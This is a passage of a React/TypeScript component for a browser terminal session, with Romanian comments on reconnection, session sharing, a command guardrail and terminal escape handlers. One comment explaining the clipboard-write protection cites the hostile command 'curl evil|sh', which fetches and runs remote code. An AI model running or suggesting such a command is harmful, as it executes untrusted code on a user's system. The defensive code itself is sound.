import { useCallback, useEffect, useRef, useState } from 'react'
import { startAuthentication } from '@simplewebauthn/browser'
import { FitAddon } from '@xterm/addon-fit'
import { SearchAddon } from '@xterm/addon-search'
import { WebLinksAddon } from '@xterm/addon-web-links'
import { IDisposable, Terminal } from '@xterm/xterm'
import { modeRestoreSeq } from '../lib/termmodes'
import { errText, api, CommandGuard, Host, Session, withStepup } from '../lib/api'
import { hostAt, hostColor, protoLabel, reachState } from '../lib/host'
import { Command, CommandTracker, cmdDuration, matchCommandRule } from '../lib/commands'
import { clearCwd, parseOsc7, setCwd } from '../lib/cwd'
import { FONT_STORAGE_KEY, preferredFont, setPreferredFont } from '../lib/font'
import { extractUrls } from '../lib/urls'
import { useI18n } from '../lib/i18n'
import { hostScheme, termTheme } from '../lib/termtheme'
import CommandsPanel from './CommandsPanel'
import FilePanel from './FilePanel'
import GitPanel from './GitPanel'
import ForwardsPanel from './ForwardsPanel'
import { CopyIcon, ExternalLinkIcon, FilesIcon, ForwardIcon, GitBranchIcon, LinkIcon, MoreIcon, NoteIcon, PasteIcon, PencilIcon, PopoutIcon, SearchIcon, StopIcon, TrashIcon } from './Icons'
import MobileKeybar from './MobileKeybar'
import SnippetsMenu from './SnippetsMenu'
import TranscriptPlayer from './TranscriptPlayer'
import { shortcutFor } from '../lib/shortcuts'
import StatusBar from './StatusBar'
import { copyText, readText } from '../lib/clipboard'
import { notify } from '../lib/notify'

type ConnState = 'connecting' | 'open' | 'reconnecting' | 'ended'

/* User-agent-ul întreg e nefolositor într-un rând de roster: 150 de caractere din care
   nouă zecimi sunt istorie („Mozilla/5.0", „like Gecko"). Vrem doar cât să deosebeşti
   telefonul tău de un browser străin, deci platformă + motor. Ordinea contează: Edge şi
   Chrome se declară amândouă „Chrome", Chrome pe iOS se declară „Safari". */
export function shortAgent(ua?: string): string {
  if (!ua) return '?'
  const os = /iPhone|iPad/.test(ua) ? 'iOS'
    : /Android/.test(ua) ? 'Android'
    : /Mac OS X/.test(ua) ? 'macOS'
    : /Windows/.test(ua) ? 'Windows'
    : /Linux/.test(ua) ? 'Linux' : ''
  const br = /Edg\//.test(ua) ? 'Edge'
    : /OPR\//.test(ua) ? 'Opera'
    : /Firefox\//.test(ua) ? 'Firefox'
    : /CriOS\//.test(ua) ? 'Chrome'
    : /Chrome\//.test(ua) ? 'Chrome'
    : /Safari\//.test(ua) ? 'Safari' : ''
  return [br, os].filter(Boolean).join(' · ') || ua.slice(0, 24)
}

// Prag watchdog client: fără niciun mesaj de la server (nici măcar ping-ul aplicativ de
// keepalive, ~25s pe idle) în acest interval, tratăm conexiunea ca moartă și reconectăm.
const WATCHDOG_MS = 60_000

/* Scrollback adaptiv: 10k linii ≈ 10-15 MB per terminal cu buffer plin.

   Al doilea consumator al aceluiaşi semnal ca `KEEP_ALIVE` din App.tsx, şi avea acelaşi
   defect: `undefined <= 4` e `false`, deci „lipseşte deviceMemory ⇒ e desktop" dădea 10k
   exact pe telefoane. Mai rău aici: `deviceMemory` e API restricţionat la SECURE CONTEXT,
   deci lipseşte şi pe orice instalare fără TLS — caz documentat şi susţinut de produs.
   Măsurat: pe `http://<ip>:port`, Chromium desktop raportează `undefined`.
   Când nu ştim memoria, ne uităm dacă e un pointer grosier (deget). */
const SCROLLBACK = (() => {
  const mem = (navigator as { deviceMemory?: number }).deviceMemory
  if (mem !== undefined) return mem <= 4 ? 3000 : 10000
  const coarse = typeof window.matchMedia === 'function'
    && window.matchMedia('(pointer: coarse)').matches
  return coarse ? 3000 : 10000
})()


export default function SessionView(props: {
  session: Session
  host?: Host
  initialSearch?: string | null
  searchNonce?: number
  popout?: boolean
  activeInSplit?: boolean
  paneActive?: boolean
  actionTarget?: boolean          // ținta acțiunilor de sesiune (în split = panoul focusat)
  /** false = tab montat dar invizibil: serverul pune fluxul pe pauză
      (economie de trafic); la revenire se face resync automat */
  streamActive?: boolean
  /** Ceremonia de step-up (passkey sau, fără WebAuthn, parola contului). Vine din App,
      unde e definită o singură dată — SessionView avea o a doua implementare, care ştia
      DOAR de passkey: pe o instalare pe IP gol (fără WebAuthn) sesiunea blocată devenea
      irecuperabilă, fiindcă nu exista nicio cale de deblocare. */
  stepupCredential?: (hostId: number) => Promise<{ stepup_grant?: string; stepup_password?: string } | null>
  onMenu: () => void
  sidebarCollapsed?: boolean
  onPopout?: () => void
  onSplitClosed?: () => void
  onChanged: () => void
  onDeleted: () => void
  /** deschide o sesiune existentă (după sid) — folosit de panoul de forward-uri
      pentru a lansa o sesiune telnet-bastion într-un tab de terminal */
  onOpenSession?: (sid: string) => void
  /** guardrail de comenzi (verificat la Enter, via OSC 133) */
  commandGuard?: CommandGuard | null
}) {
  const { session } = props
  const { t } = useI18n()
  const containerRef = useRef<HTMLDivElement>(null)
  // lățimea REALĂ a pane-ului (nu a viewportului): sub prag, panourile laterale
  // devin drawer overlay ca să nu strivească terminalul (split pe iPad)
  const rootRef = useRef<HTMLDivElement>(null)
  const [narrowPane, setNarrowPane] = useState(false)
  useEffect(() => {
    const el = rootRef.current
    if (!el) return
    const ro = new ResizeObserver(() => setNarrowPane(el.clientWidth < 560))
    ro.observe(el)
    return () => ro.disconnect()
  }, [])
  // epoch (ms) of the operator's last keypress/click in this terminal — gates the
  // OSC 52 clipboard write so a remote host can't silently poison the clipboard
  const lastInputRef = useRef(0)
  const termRef = useRef<Terminal>()
  const fitRef = useRef<FitAddon>()
  const searchRef = useRef<SearchAddon>()
  // renderer accelerat curent (WebGL/Canvas) + funcția care-l (re)încarcă. La
  // schimbarea fontului îl RECREĂM: WebGL rămâne gol la resize/font change și
  // nici clearTextureAtlas nu repară — un addon nou la noua dimensiune e curat.
  const rendererRef = useRef<{ dispose(): void }>()
  const reloadRendererRef = useRef<() => void>()
  const rendererGenRef = useRef(0)   // apăsări rapide A−/A+: doar ultima încărcare rămâne
  const wsRef = useRef<WebSocket | null>(null)
  const retryRef = useRef({ delay: 1000, timer: 0 as ReturnType<typeof setTimeout> | 0 })
  // Watchdog anti „half-open": serverul trimite un ping aplicativ la ~25s chiar pe idle;
  // dacă n-a venit NICIUN mesaj în WATCHDOG_MS, conexiunea TCP a fost tăiată fără FIN
  // (NAT/proxy/router pe drum) → onclose nu s-a declanșat → forțăm close → reconnect.
  const watchdogRef = useRef<ReturnType<typeof setTimeout> | 0>(0)
  // Replayed history can contain terminal queries (DA/DSR); xterm auto-replies
  // and those replies would be typed into the shell as garbage. While a tail
  // replay is being parsed we mute terminal->server data.
  const expectTailRef = useRef(false)
  // sesiunea a primit exit/lost: reconnect-ul de aducere a istoricului trebuie să fie
  // ONE-SHOT (fără buclă infinită de reconnect+replay dacă serverul închide socketul)
  const exitedRef = useRef(false)
  const muteRef = useRef(false)
  const replayRef = useRef(false)   // scriem istoric, nu activitate live (vezi OSC 133)
  const streamDecoderRef = useRef(new TextDecoder('utf-8'))   // pt. captura output-ului
  // termen de căutare care așteaptă finalizarea replay-ului de istoric
  const pendingFindRef = useRef<string | null>(null)
  // keep-alive (tab-uri ținute montate): la comutare, terminalul rămas ascuns
  // ar păstra focusul tastaturii — refocalizăm explicit pe cel devenit vizibil
  useEffect(() => {
    if (props.paneActive) termRef.current?.focus()
  }, [props.paneActive])


  // pause/resume pe flux: tab-urile invizibile nu primesc output live de la
  // server; la reactivare, serverul trimite resync + tail (cortina acoperă
  // sincronizarea). Ref-ul e pentru onopen — la reconectare cât tab-ul e
  // ascuns, punem imediat pauza înapoi.
  const streamActiveRef = useRef(props.streamActive !== false)
  useEffect(() => {
    // DOAR panourile ascunse se pauzează — NU și fereastra ascunsă (lecția
    // v1.0.15): un ws complet tăcut e omorât de Cloudflare/Traefik ca idle
    // (~100s) → buclă de reconectare cu re-descărcarea tail-ului la 2 minute.
    // Conexiunile pauzate sunt ținute vii de sondajul de RTT (mai jos).
    const active = props.streamActive !== false
    streamActiveRef.current = active
    const ws = wsRef.current
    if (ws?.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ type: active ? 'resume' : 'pause' }))
    }
  }, [props.streamActive])

  // RTT către gateway, măsurat pe websocket-ul sesiunii (doar pe tab-ul
  // vizibil, cu fereastra în prim-plan) — afișat în StatusBar
  const [rtt, setRtt] = useState<number | null>(null)
  const rttSentRef = useRef(new Map<number, number>())
  const rttSeqRef = useRef(0)
  // ultima selecție copiată de copy-on-select: Ctrl+C pe aceeași selecție
  // trimite SIGINT (e deja în clipboard), nu o recopiază
  const lastCopiedRef = useRef<string | null>(null)

  const [conn, setConn] = useState<ConnState>('connecting')
  const [exited, setExited] = useState<{ status: number | null; reason: string } | null>(
    session.state === 'closed' || session.state === 'lost'
      ? { status: session.exit_status, reason: session.close_reason ?? session.state }
      : null,
  )
  const [locked, setLocked] = useState(false)     // idle-lock 2FA: terminal blocat
  const [unlocking, setUnlocking] = useState(false)
  const [lockErr, setLockErr] = useState('')
  const unlockBtnRef = useRef<HTMLButtonElement>(null)
  const [reconnecting, setReconnecting] = useState(false)
  const [title, setTitle] = useState(session.title)
  const [note, setNote] = useState(session.note)
  const [showNote, setShowNote] = useState(!!session.note)
  const [showSearch, setShowSearch] = useState(false)
  const [snippetsOpen, setSnippetsOpen] = useState(false)
  const [showPlayer, setShowPlayer] = useState(false)
  // guardrail de comenzi: config live într-un ref (handler-ul de taste e capturat la
  // montare, deci nu poate citi prop-ul direct), + dialog de confirmare + mesaj tranzitoriu
  const commandGuardRef = useRef(props.commandGuard)
  useEffect(() => { commandGuardRef.current = props.commandGuard }, [props.commandGuard])
  // `t` prin ref, ca `commandGuard` de mai sus. Efectul terminalului depinde doar de
  // `session.id` (are `eslint-disable` pe `exhaustive-deps`, deliberat: re-rularea lui ar
  // distruge şi ar reconstrui terminalul viu la fiecare schimbare de limbă). Dar `t` intra în
  // handlerul de taste, care trăieşte cât sesiunea — deci după comutarea limbii mesajul de
  // guardrail rămânea în limba veche până la remontare. Ref-ul e citit la momentul apelului,
  // deci mereu proaspăt, fără să atingem ciclul de viaţă al terminalului.
  const tRef = useRef(t)
  tRef.current = t
  const [cmdConfirm, setCmdConfirm] = useState<{ cmd: string } | null>(null)
  const [guardMsg, setGuardMsg] = useState<string | null>(null)
  // comenzi (OSC 133) — apar doar cu shell integration activă pe host
  const trackerRef = useRef<CommandTracker>()
  const cwdRef = useRef<string | null>(null)   // cwd curent, pt. raportarea în istoric (fără stale closure)
  const decorationsRef = useRef<IDisposable[]>([])
  const [commands, setCommands] = useState<Command[]>([])
  const [showCommands, setShowCommands] = useState(false)
  // panourile din dreapta (comenzi / fișiere / git / forward-uri) împart marginea → unul o dată
  const [showFiles, setShowFiles] = useState(false)
  const [showForwards, setShowForwards] = useState(false)
  const [showGit, setShowGit] = useState(false)
  const toggleFiles = () => setShowFiles((v) => { if (!v) { setShowCommands(false); setShowForwards(false); setShowGit(false) } return !v })
  const toggleCommands = () => setShowCommands((v) => { if (!v) { setShowFiles(false); setShowForwards(false); setShowGit(false) } return !v })
  const toggleForwards = () => setShowForwards((v) => { if (!v) { setShowFiles(false); setShowCommands(false); setShowGit(false) } return !v })
  const toggleGit = () => setShowGit((v) => { if (!v) { setShowFiles(false); setShowCommands(false); setShowForwards(false) } return !v })
  const [activeCmd, setActiveCmd] = useState<number | null>(null)
  const activeCmdRef = useRef<number | null>(null)   // citit de stepCommand (handler-ul de taste e capturat la montare)
  // cwd raportat de shell prin OSC 7 (apare doar cu shell integration activă)
  const [cwd, setCwdState] = useState<string | null>(null)
  // tab focus mode (Ctrl+M): Tab iese din terminal în loc să ajungă în shell
  const [tabFocusMode, setTabFocusMode] = useState(false)
  const tabFocusRef = useRef(false)
  useEffect(() => { tabFocusRef.current = tabFocusMode }, [tabFocusMode])

  // idle-lock (host 2FA): la blocare, mută focusul pe butonul de deblocare — altfel
  // focusul rămâne în terminalul acum inaccesibil, iar un utilizator de tastatură /
  // cititor de ecran n-are cum să ajungă la acțiunea cerută (role="alertdialog" o anunță).
  // La deblocare (tranziția lock→unlock) redă focusul terminalului, ca să nu cadă pe body.
  const prevLockedRef = useRef(false)
  useEffect(() => {
    if (locked) unlockBtnRef.current?.focus()
    else if (prevLockedRef.current) termRef.current?.focus()
    prevLockedRef.current = locked
  }, [locked])
  const [search, setSearch] = useState('')
  // per dispozitiv, nu per tab: vezi lib/font.ts pentru clase și migrare
  const [fontSize, setFontSize] = useState(preferredFont)
  const [copied, setCopied] = useState(false)
  const [shareUrl, setShareUrl] = useState<string | null>(null)
  const [shareOpen, setShareOpen] = useState(false)          // panoul de opțiuni
  const [shareWritable, setShareWritable] = useState(false)  // opțiune: writable?
  const [shareExpiry, setShareExpiry] = useState(1440)       // opțiune: minute
  const [shareIsWritable, setShareIsWritable] = useState(false)  // al link-ului DEJA generat
  // roster (cine e conectat) + kick — pentru owner
  const [roster, setRoster] = useState<{
    id: string; label: string; owner: boolean; writable: boolean
    ip?: string; agent?: string; known?: boolean; since?: number
  }[]>([])
  const yourIdRef = useRef<string | null>(null)
  const [showRoster, setShowRoster] = useState(false)
  // cortină peste terminal cât se scrie replay-ul de istoric: conținutul apare
  // doar complet și la dimensiunile finale, nu construindu-se sub ochii tăi
  const [replaying, setReplaying] = useState(true)
  useEffect(() => {
    if (!replaying) return
    // plasă de siguranță: dacă tail-ul nu vine (conexiune moartă), nu rămânem
    // cu cortina trasă — retry-ul o re-activează singur la următorul onopen
    const t = setTimeout(() => setReplaying(false), 4000)
    return () => clearTimeout(t)
  }, [replaying])
  const [moreOpen, setMoreOpen] = useState(false)
  // meniul „Linkuri": URL-urile din buffer, extrase la deschidere (nu continuu) — vezi lib/urls
  const [linksOpen, setLinksOpen] = useState(false)
  const [links, setLinks] = useState<string[]>([])
  const openLinks = useCallback(() => {
    setLinks(extractUrls(termRef.current))
    setLinksOpen(true)
  }, [])
  const [ctxMenu, setCtxMenu] = useState<{ x: number; y: number } | null>(null)
  const longPressRef = useRef<number | null>(null)
  const remoteResizeReloadRef = useRef<number | null>(null)   // debounce pt. recrearea rendererului la resize de la alt client
  // Escape închide meniul contextual (înainte ca xterm să trimită Esc în shell)
  useEffect(() => {
    if (!ctxMenu) return
    const onKey = (e: KeyboardEvent) => {
      if (e.key === 'Escape') {
        e.preventDefault()
        e.stopPropagation()
        setCtxMenu(null)
      }
    }
    window.addEventListener('keydown', onKey, true)
    return () => window.removeEventListener('keydown', onKey, true)
  }, [ctxMenu])
  // schema terminalului: override per-host dacă există („prod = roșiatic"),
  // altfel cea globală
  const themeForHost = () => termTheme(hostScheme(props.host?.id))
  const [termBg, setTermBg] = useState(() => themeForHost().background || '#0b0e14')
  const isLive = !exited

  // sondajul de RTT rulează pe TOATE panourile montate, indiferent de pauză:
  // pe lângă măsurătoare, frame-urile lui mici sunt keepalive-ul care împiedică
  // proxy-ul (Cloudflare/Traefik) să taie ca idle conexiunile pauzate sau
  // sesiunile liniștite. La 30s: sub orice timeout de idle uzual (~100s),
  // iar în ferestre ascunse browserul îl răreste singur la ~60s — tot suficient.
  useEffect(() => {
    if (!isLive) return
    const probe = () => {
      const ws = wsRef.current
      if (ws?.readyState !== WebSocket.OPEN) return
      const n = ++rttSeqRef.current
      rttSentRef.current.set(n, performance.now())
      // păstrează harta mică dacă serverul nu răspunde (gateway vechi)
      if (rttSentRef.current.size > 10) {
        const oldest = rttSentRef.current.keys().next().value!
        rttSentRef.current.delete(oldest)
      }
      ws.send(JSON.stringify({ type: 'rtt', n }))
    }
    probe()
    const t = setInterval(probe, 30000)
    return () => clearInterval(t)
  }, [isLive, conn])

  function share() {
    setShareOpen((v) => !v)   // deschide panoul de opțiuni (writable/expirare)
  }

  async function createShareLink() {
    try {
      // host cu 2FA → crearea share-ului cere step-up (H1); withStepup rulează ceremonia
      // passkey/parolă și reîncearcă o dată. Ruta n-are host_id în URL, deci îl dăm explicit.
      const r = await withStepup(session.host_id, () =>
        api<{ url: string; writable: boolean }>(`/api/sessions/${session.id}/share`, {
          method: 'POST', body: JSON.stringify({ writable: shareWritable, expires_minutes: shareExpiry }),
        }))
      setShareUrl(r.url)
      setShareIsWritable(r.writable)
      setShareOpen(false)
    } catch (e) {
      alert(errText(e, t) || t('session.shareLinkFailed'))
    }
  }

  async function revokeShare() {
    // Un clic omora instantaneu linkul, fără drum înapoi: cine îl are deschis vede pagina
    // de 403, iar linkul nu se poate reactiva — se generează altul. Era singura acţiune
    // distructivă din produs fără confirmare, deşi restul cer chiar şi pentru mai puţin.
    if (!confirm(t('session.confirmRevokeShare'))) return
    await api(`/api/sessions/${session.id}/share`, { method: 'DELETE' }).catch(() => {})
    setShareUrl(null)
    setShareIsWritable(false)
  }

  // owner scoate un invitat din sesiune
  const kick = (id: string) => {
    const ws = wsRef.current
    if (ws?.readyState === WebSocket.OPEN) ws.send(JSON.stringify({ type: 'kick', id }))
  }

  const send = useCallback((data: string | Uint8Array) => {
    if (muteRef.current) return
    const ws = wsRef.current
    if (ws?.readyState === WebSocket.OPEN) {
      ws.send(typeof data === 'string' ? new TextEncoder().encode(data) : data)
    }
  }, [])

  // `active` = acest client tocmai a devenit dispozitivul folosit (focus/click/tastare).
  // Serverul onorează un resize activ chiar dacă n-am mai interacționat de mult; fără
  // el, un VIZUALIZATOR pasiv de fundal ar smulge dimensiunea de la dispozitivul activ.
  const sendResize = useCallback((active = false) => {
    const term = termRef.current
    const ws = wsRef.current
    if (term && ws?.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ type: 'resize', rows: term.rows, cols: term.cols, active }))
    }
  }, [])

  // re-măsoară terminalul și anunță serverul DOAR dacă dimensiunea s-a schimbat
  // (fit e idempotent, deci apelul e sigur oricând — fără churn când e deja corect).
  // La activare (active=true) retrimitem dimensiunea CHIAR dacă nu s-a schimbat local:
  // PTY-ul poate fi la dimensiunea altui client care ne-a micșorat, iar noi (acum
  // dispozitivul activ) trebuie să ne-o reclamăm — altfel rămânem mici până la A−/A+.
  const refit = useCallback((active = false) => {
    const term = termRef.current
    const fit = fitRef.current
    if (!term || !fit) return
    const before = term.rows * 100000 + term.cols
    fit.fit()
    if (active || term.rows * 100000 + term.cols !== before) sendResize(active)
    // forțează un repaint chiar dacă dimensiunea n-a schimbat: după un upgrade de
    // agent (reconectare în masă), tab-urile din fundal pot rămâne cu un render
    // „stricat" deși dimensiunea e corectă — fit()-ul singur (no-op) nu-l curăță.
    // refresh redesenează bufferul curent, exact ce făcea A−/A+ prin schimbarea fontului.
    term.refresh(0, term.rows - 1)
  }, [sendResize])

  // Auto-recuperare a desincronizării de dimensiune xterm↔container: la revenirea
  // pe terminal (focus fereastră, tab redevine vizibil, pane redevine activ) forțăm
  // un re-fit. Fără asta, dacă xterm rămâne la o dimensiune veche (ex. fereastra
  // s-a redimensionat cât eram pe alt tab/app), TUI-urile (Claude Code) se strică
  // și doar A−/A+ manual repara. ResizeObserver-ul prinde doar schimbările de
  // container, nu și cazul „am revenit și xterm-ul e la altă dimensiune".
  useEffect(() => {
    if (props.paneActive === false) return
    const activate = () => refit(true)        // devenim dispozitivul activ → reclamăm dimensiunea
    activate()                                // la (re)activarea pane-ului
    // Tab revenit vizibil: recreează rendererul WebGL. Browserul poate elibera contextul GPU
    // al unui tab din fundal (fără a emite mereu `contextlost`) → la revenire ecranul e ALB deşi
    // bufferul xterm are tot textul; `refresh()` nu ajută (contextul GL e mort). Reload-ul îl
    // recreează şi repaintează din buffer — cauza „b" din analiza de resync (renderer, nu date).
    const onVis = () => { if (!document.hidden) { reloadRendererRef.current?.(); activate() } }
    window.addEventListener('focus', activate)
    document.addEventListener('visibilitychange', onVis)
    return () => {
      window.removeEventListener('focus', activate)
      document.removeEventListener('visibilitychange', onVis)
    }
  }, [props.paneActive, refit])

  // acțiunile de sesiune venite din scurtături / paletă (App emite, panoul
  // ACTIV răspunde — altfel toate tab-urile montate ar reacționa deodată). În split,
  // ținta e panoul FOCUSAT (actionTarget), nu ambele — un snippet trebuie să meargă
  // pe un singur host. Fallback la paneActive dacă prop-ul nu e pasat.
  const isActionTarget = props.actionTarget ?? props.paneActive
  useEffect(() => {
    if (isActionTarget === false) return
    const onSearch = () => setShowSearch(true)
    const onSnippets = () => setSnippetsOpen((v) => !v)
    const onFont = (e: Event) => {
      const d = (e as CustomEvent<number>).detail
      // trece prin preferință, nu prin state-ul local: se persistă per dispozitiv
      // și se propagă în toate taburile montate (vezi lib/font.ts)
      setPreferredFont(preferredFont() + d)
    }
    const onInsert = (e: Event) => {
      send((e as CustomEvent<string>).detail)
      termRef.current?.focus()
    }
    window.addEventListener('wt-session-search', onSearch)
    window.addEventListener('wt-session-snippets', onSnippets)
    window.addEventListener('wt-session-font', onFont)
    window.addEventListener('wt-session-insert', onInsert)
    return () => {
      window.removeEventListener('wt-session-search', onSearch)
      window.removeEventListener('wt-session-snippets', onSnippets)
      window.removeEventListener('wt-session-font', onFont)
      window.removeEventListener('wt-session-insert', onInsert)
    }
  }, [isActionTarget, send])

  // -- terminal lifecycle ----------------------------------------------------

  useEffect(() => {
    const term = new Terminal({
      fontSize,
      fontFamily: '"JetBrains Mono", "Cascadia Code", Menlo, monospace',
      theme: themeForHost(),
      scrollback: SCROLLBACK,
      allowProposedApi: true,
      // opt-in din Setări: xterm creează regiuni live off-screen ca cititoarele
      // de ecran să anunțe output-ul (fără el, terminalul e complet mut pentru
      // ele). Costă DOM + anunțuri la fiecare scriere → nu e implicit.
      screenReaderMode: localStorage.getItem('wt_sr') === '1',
      // TUI-urile (Claude Code, lazygit…) desenează chenare și texte „dim" în
      // gri-uri 256/truecolor pe care paleta noastră nu le controlează; pe
      // fundal aproape negru devin ilizibile. xterm ridică automat culorile
      // sub acest contrast (4.5 = default-ul VS Code, WCAG AA).
      minimumContrastRatio: 4.5,
    })
    const fit = new FitAddon()
    const searchAddon = new SearchAddon()
    term.loadAddon(fit)
    term.loadAddon(searchAddon)
    term.loadAddon(new WebLinksAddon())
    // OSC 133 („semantic prompts"): marcajele emise de shell integration ne dau
    // comenzile ca obiecte — salt între ele, exit code, durată, copierea exactă
    // a output-ului. Fără integrare, handler-ul pur și simplu nu primește nimic.
    const tracker = new CommandTracker(term)
    trackerRef.current = tracker
    tracker.onChange = () => {
      setCommands([...tracker.commands])
      // Semn în MARGINEA din stânga, nu peste text: decorația xterm ocupă o
      // celulă (ar recolora primul caracter al output-ului, cum s-a întâmplat
      // în v1.0.20), deci o mutăm în padding cu CSS și o facem o bară subțire.
      const last = tracker.commands[tracker.commands.length - 1]
      if (last) {
        const d = term.registerDecoration({ marker: last.startMarker, x: 0, width: 1 })
        if (d) {
          d.onRender((el) => {
            el.style.background = last.exitCode ? '#f87171' : '#34d399'
            el.style.width = '3px'
            el.style.marginLeft = '-5px'
            el.style.borderRadius = '2px'
            el.style.pointerEvents = 'none'
          })
          decorationsRef.current.push(d)
          // plafon în paralel cu comenzile (tracker păstrează max 500): altfel
          // array-ul de decorații crește 1/comandă la infinit pe sesiuni lungi
          while (decorationsRef.current.length > 500) decorationsRef.current.shift()?.dispose()
        }
      }
    }
    // raportează fiecare comandă finalizată în istoricul global (best-effort;
    // dacă pică rețeaua, nu deranjăm sesiunea)
    tracker.onCommand = (cmd) => {
      api('/api/history', {
        method: 'POST',
        body: JSON.stringify({
          host_id: props.host?.id ?? null, command: cmd.text,
          exit_code: cmd.exitCode ?? null, cwd: cwdRef.current ?? '',
        }),
      }).catch(() => {})
    }
    term.parser.registerOscHandler(133, (data) => {
      if (!replayRef.current) tracker.handle(data)   // istoricul rejucat nu e activitate live
      return true
    })
    // OSC 7: directorul curent raportat de shell la fiecare prompt. Îl ținem în
    // state (afișat în StatusBar) și într-un store per-sesiune, ca panoul de
    // fișiere să urmărească `cd`-ul. Ecran alternativ (vim/htop) nu emite OSC 7.
    term.parser.registerOscHandler(7, (data) => {
      const p = parseOsc7(data)
      if (p) {
        setCwdState(p)
        cwdRef.current = p
        setCwd(session.id, p)
      }
      return true
    })
    // OSC 52: selecția cu mouse-ul din tmux ajunge în clipboardul browserului.
    // Handler propriu, nu @xterm/addon-clipboard: tmux emite destinația goală
    // (]52;;<b64>), pe care addon-ul o ignoră.
    term.parser.registerOscHandler(52, (data) => {
      const semi = data.indexOf(';')
      const payload = semi >= 0 ? data.slice(semi + 1) : data
      if (payload === '?') return true // cererile de citire nu se onorează
      // Doar ca urmare a unei acțiuni recente a operatorului (selecție cu mouse-ul
      // / tastare). Fără poarta asta, orice output al hostului (`cat` la un fișier
      // ostil, un program compromis) poate suprascrie clipboardul cu, de ex.,
      // `curl evil|sh\n` și aștepta un paste. Plus un plafon de dimensiune.
      if (Date.now() - lastInputRef.current > 10000) return true
      if (payload.length > 200000) return true
      try {
        const bytes = Uint8Array.from(atob(payload), (ch) => ch.charCodeAt(0))
        copyText(new TextDecoder().decode(bytes))
      } catch {
        /* base64 invalid: ignoră */
      }
      return true
    })
    term.open(containerRef.current!)
    fit.fit()
    termRef.current = term
    fitRef.current = fit
    searchRef.current = searchAddon
    // handle pt. E2E/debug: cu renderer WebGL/Canvas conținutul nu mai e în DOM ca
    // text, deci testele (și tu, la debug) îl citesc din buffer prin instanța asta
    ;((window as unknown as { __wtTerms?: Map<string, Terminal> }).__wtTerms ??= new Map()).set(session.id, term)

    const onData = term.onData((d) => {
      lastInputRef.current = Date.now()
      send(d)
    })
    const onBinary = term.onBinary((d) => {
      const bytes = new Uint8Array(d.length)
      for (let i = 0; i < d.length; i++) bytes[i] = d.charCodeAt(i) & 0xff
      send(bytes)
    })
    // mouse-selection copy (tmux → OSC 52) is a pointer gesture; count it too
    const markInput = () => {
      lastInputRef.current = Date.now()
      // click pe acest dispozitiv = e cel activ → reclamă dimensiunea PTY dacă un
      // alt client (ex. telefonul) ne-a micșorat. Fără asta, dacă fereastra n-a
      // pierdut focus-ul în browser nu se declanșează niciun re-fit și rămâi mic
      // până la A−/A+. `fit` e idempotent, iar serverul deduplică dacă e deja corectă.
      fitRef.current?.fit()
      sendResize(true)
    }
    containerRef.current!.addEventListener('pointerdown', markInput)

    // Bifa „✓ copiat" apărea şi când copierea EŞUA (origine fără TLS + execCommand
    // refuzat): utilizatorul lipea în Slack ce era acolo înainte. Semnalul e rezultatul
    // real al copierii, nu faptul că s-a apăsat butonul.
    const flashCopied = (ok: boolean) => {
      if (!ok) return
      setCopied(true)
      setTimeout(() => setCopied(false), 1200)
    }
    // Ctrl/Cmd+C inteligent (ca terminalul din VS Code): cu selecție activă
    // copiază în clipboard; fără selecție trimite ^C (SIGINT) normal.
    // Ctrl+Shift+C copiază mereu. După copiere selecția se golește, ca
    // următorul Ctrl+C să întrerupă, nu să recopieze.
    term.attachCustomKeyEventHandler((e) => {
      if (e.type !== 'keydown') return true
      // Guardrail de comenzi: la Enter simplu, verificăm comanda TASTATĂ (via OSC 133)
      // ÎNAINTE s-o trimitem. block → curăță linia; confirm → dialog. Fără shell
      // integration (promptRow lipsă) sau într-un TUI, pendingCommand e null → trece.
      if (e.key === 'Enter' && !e.ctrlKey && !e.altKey && !e.metaKey && !e.shiftKey) {
        const cmd = trackerRef.current?.pendingCommand()
        const rule = cmd ? matchCommandRule(cmd, commandGuardRef.current) : null
        if (rule && cmd) {
          if (rule.action === 'block') {
            send('\x15')   // Ctrl+U: șterge linia periculoasă din shell
            setGuardMsg(tRef.current('session.blockedByGuardrail', { cmd: cmd.slice(0, 70) }))
            window.setTimeout(() => setGuardMsg((m) => (m && m.includes(cmd.slice(0, 70)) ? null : m)), 4000)
          } else {
            setCmdConfirm({ cmd })   // confirm: dialog (Enter e blocat mai jos)
          }
          return false               // NU trimite Enter la host
        }
      }
      // Ctrl+M: „tab focus mode" (modelul VS Code) — cât e activ, Tab NU mai
      // intră în shell, ci mută focusul în afara terminalului. Fără el,
      // terminalul e o capcană pentru navigarea exclusiv din tastatură.
      if (e.ctrlKey && e.code === 'KeyM' && !e.shiftKey && !e.altKey && !e.metaKey) {
        setTabFocusMode((v) => !v)
        return false
      }
      if (tabFocusRef.current && e.key === 'Tab') return false   // lasă browserul să mute focusul
      // Alt+↑/↓: sari la comanda anterioară/următoare (OSC 133). Alt+←/→ sunt
      // tab-urile, deci familia rămâne coerentă.
      if (e.altKey && !e.ctrlKey && !e.metaKey && (e.code === 'ArrowUp' || e.code === 'ArrowDown')) {
        stepCommand(e.code === 'ArrowUp' ? -1 : 1)
        return false
      }
      if ((e.ctrlKey || e.metaKey) && (e.key === 'c' || e.key === 'C')
          && (e.shiftKey || term.hasSelection())) {
        const sel = term.getSelection()
        if (!sel) return true
        // selecția e deja în clipboard (copy-on-select)? atunci Ctrl+C simplu
        // înseamnă „întrerupe procesul": golește selecția și lasă ^C să treacă
        if (!e.shiftKey && sel === lastCopiedRef.current) {
          term.clearSelection()
          return true
        }
        copyText(sel).then(flashCopied)
        term.clearSelection()
        return false
      }
      return true
    })
    // copy-on-select: selecția locală xterm (Shift+drag peste aplicații care
    // folosesc mouse-ul, dublu-click pe cuvânt) intră în clipboard la ridicarea
    // mouse-ului — fiind gest de utilizator, scrierea merge și în Safari.
    // Selecția din tmux (drag simplu) vine separat, prin OSC 52.
    const copyOnSelect = (e: PointerEvent) => {
      // doar butonul principal: click-dreapta (meniul contextual) nu trebuie să
      // suprascrie clipboardul chiar înainte ca utilizatorul să aleagă „Lipește"
      if (e.button !== 0) return
      const sel = term.getSelection()
      if (sel) {
        copyText(sel).then(flashCopied)
        lastCopiedRef.current = sel
      }
    }
    containerRef.current!.addEventListener('pointerup', copyOnSelect)

    // Touch-scroll: xterm scroll-ează nativ pe touch DOAR în buffer normal, cu
    // scrollback și fără mouse activ (face `viewport.scrollTop += dy`). În rest
    // handlerul lui e no-op, deci pe mobil degetul nu mișcă nimic:
    //   • aplicații cu mouse (tmux-mouse, vim-mouse) → touch-ul e gated off;
